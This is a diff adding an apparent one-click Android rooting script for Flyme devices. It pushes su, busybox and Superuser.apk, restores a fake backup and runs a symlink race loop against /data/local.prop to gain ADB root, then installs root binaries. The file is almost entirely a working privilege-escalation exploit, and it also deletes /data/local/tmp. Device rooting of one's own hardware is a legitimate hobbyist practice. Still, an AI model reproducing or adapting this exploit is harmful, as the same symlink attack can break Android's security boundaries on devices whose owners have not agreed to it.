@@ -1,0 +1,35 @@
+$ON uid=2000(shell), $HALT $ECHO Failed.  I cannot handle this version of Flyme
+$ON uid=0(root), $ECHO Sucessful!  I am in ur device usin' ur root.  Performing actions to deliver root to you.. 
+shell "rm -r /data/local/tmp"
+shell "mkdir /data/local/tmp "
+
+$ECHO Pushing Files
+push "$ZIPFILEbusybox" /data/local/tmp/
+push "$ZIPFILEsu" /data/local/tmp/
+push "$ZIPFILEbash" /data/local/tmp/
+push "$ZIPFILErootGN.sh" /data/local/tmp/
+push "$ZIPFILESuperuser.apk" /data/local/tmp/
+shell "chmod 777 /data/local/tmp/busybox"
+shell "chmod 777 /data/local/tmp/bash"
+shell "chmod 777 /data/local/tmp/rootGN.sh"
+
+$ECHO ATTEMPTING EXPLOIT
+restore "$ZIPFILEfakebackup.ab"
+$USERNOTIFICATION Attempting Exploit!, After you press OK\n  Press the "Restore my data" button on your phone.
+shell "/data/local/tmp/bash -c 'count=0; while [ $count -lt 8000 ]; do (( count++ )); ln -s /data/local.prop /data/data/com.android.settings/a/file99 >/dev/null 2>&1; test -e /data/local.prop && break; done'
+$ECHO Exploit Attempt complete, ADB Root should be enabled
+shell "sync"
+$ECHO Rebooting into emulator mode
+reboot
+wait-for-device
+shell "sleep 30" 
+wait-for-device
+$ECHO Installing binaries
+shell "sh /data/local/tmp/rootGN.sh"
+$ECHO Cleaning up
+shell "rm /data/local.prop"
+$ECHO Rebooting into normal mode. You may need to hold power for 10 seconds to reboot the device manually.
+reboot
+install "$ZIPFILESuperuser.apk"
+wait-for-device
+$ECHO Done
